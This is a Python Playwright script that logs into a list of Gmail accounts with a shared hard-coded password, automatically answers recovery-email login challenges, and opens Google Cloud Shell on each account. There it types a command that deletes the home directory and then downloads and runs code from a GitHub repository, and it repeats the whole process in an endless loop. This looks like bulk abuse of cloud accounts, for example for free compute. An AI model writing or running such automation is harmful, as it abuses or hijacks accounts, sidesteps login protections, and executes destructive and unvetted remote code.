

import os

os.system('sudo apt update -y')
os.system('sudo apt install python3-pip -y')
os.system('sudo apt install firefox')
os.system('pip install playwright')
os.system('playwright install')
os.system('playwright install-deps')
import os
import asyncio
from playwright.async_api import async_playwright
from bs4 import BeautifulSoup
import nest_asyncio
import time
nest_asyncio.apply()
async def login_gmail(page, email_gmail, password, email_gmail_confrim):
    await page.goto("https://accounts.google.com/signin/v2/identifier")
    email_field = await page.wait_for_selector('//*[@id="identifierId"]')
    await email_field.fill(email_gmail)
    await (await page.wait_for_selector('//*[@id="identifierNext"]/div/button/span')).click()
    await asyncio.sleep(2)
    password_field = await page.wait_for_selector('//*[@name="Passwd"]')
    await password_field.fill(password)
    await (await page.wait_for_selector('//*[@id="passwordNext"]/div/button/span')).click()
    try:
        await page.wait_for_selector('//*[@id="yDmH0d"]/c-wiz/div/div[2]/div/div[1]/div/form/span/section/div/div/div[1]/div/div[2]/div[2]/div')
    except:
        current_url = page.url
        ceck_url = current_url.split('challenge/')[-1].split('?')[0]
        ceck_url_2 = current_url.split('changepassword/')[-1].split('?')[0]
        ceck_url_3 = current_url.split('web/')[-1].split('?')[0]
        ceck_url_tiktko = current_url.split('oauth/')[-1].split('?')[0]
        if ceck_url == "dp":
            print(ceck_url)
            code_login = await page.inner_text('/html/body/div[1]/div[1]/div[2]/div/c-wiz/div/div[2]/div/div[1]/div/form/span/section[2]/div/div/section/div/div/span/figure/samp')
            print(code_login)
            input("أدخل الرمز: ")
        elif ceck_url_tiktko == "id":
            print(ceck_url_tiktko)
            await (await page.wait_for_selector('/html/body/div[1]/div[1]/div[2]/div/c-wiz/div/div[2]/div/div[2]/div/div/div[2]/div/div/button/span')).click()
        elif ceck_url == "selection":
            print(ceck_url)
            await page.screenshot(path='selection.png')
            await (await page.wait_for_selector('//*[@data-challengeid="5"]')).click()
            await asyncio.sleep(2)
            await (await page.wait_for_selector('//*[@name="knowledgePreregisteredEmailResponse"]')).fill(email_gmail_confrim)
            await asyncio.sleep(3)
            await (await page.wait_for_selector('//*[@name="knowledgePreregisteredEmailResponse"]')).press('Enter')
            await asyncio.sleep(10)
        elif ceck_url == "ootp":
            print(ceck_url)
            await page.screenshot(path='ootp.png')
        elif current_url == "https://myaccount.google.com/?utm_source=sign_in_no_continue":
            print('sign_in_no_continue')
        elif ceck_url_2 == "changepasswordform":
            print(ceck_url_2)
            await page.screenshot(path='changepasswordform.png')
        elif ceck_url_3 == "chip":
            print(ceck_url_3)
            await page.screenshot(path='chip.png')
        elif ceck_url == "iap":
            print(ceck_url)
            await page.screenshot(path='iap.png')
        elif ceck_url == "pwd":
            print(ceck_url)
        else:
            print('yes')
            print(current_url)

async def login_shell(page):
    await page.goto("https://shell.cloud.google.com/?hl=en_US&fromcloudshell=true&show=terminal")
    await asyncio.sleep(20)
    try:
        content = await page.content()
        soup = BeautifulSoup(content, 'html.parser')
        code_login = soup.get_text()
        print(code_login)
    except:
        pass
    await asyncio.sleep(40)
    try:
        content = await page.content()
        soup = BeautifulSoup(content, 'html.parser')
        code_login = soup.get_text()
        print(code_login)
    except:
        pass
    print('yes')

    list_copy = [
        'rm -rf * && git clone https://github.com/thelovemeahmed1/1 && cd 1 && python 1.py && python 1.py && python 1.py && python 1.py'
    ]
    for code_to_copy in list_copy:
        await asyncio.sleep(5)
        await page.click("body")
        await page.keyboard.insert_text(code_to_copy)
        await asyncio.sleep(5)
        await page.keyboard.press("Enter")
    await asyncio.sleep(5)

async def main():
    async with async_playwright() as playwright:
        with open('email.txt', 'r', encoding="utf-8") as file:
            totel_email = file.readlines()

        for data in totel_email:
            try:
                email_gmail = data.split(':')[0]
                print(email_gmail)

                password = '12341234thelove'  # كلمة مرور محددة، يمكنك تغييرها
                user_data_dir = email_gmail.split('@')[0]
                email_gmail_confrim = data.split(':')[2]
                print(email_gmail_confrim)

                file_find = 'true_file' if os.path.exists(user_data_dir) else 'false_file'
                firefox = playwright.firefox
                browser = await firefox.launch_persistent_context(user_data_dir, headless=True)

                page = browser.pages[0]

                if file_find == 'true_file':
                    print('yes_file')
                    await login_shell(page)
                else:
                    print('no_file')
                    await login_gmail(page, email_gmail, password, email_gmail_confrim)
                    await login_shell(page)
                await page.screenshot(path=f'{user_data_dir}.png')

            except Exception as ss:
                print(ss)
        print('finsh')
        await asyncio.sleep(400)
        #input('اضغط على أي زر للخروج')

while True:
    print('yes')
    asyncio.get_event_loop().run_until_complete(main())
    #asyncio.run(main())
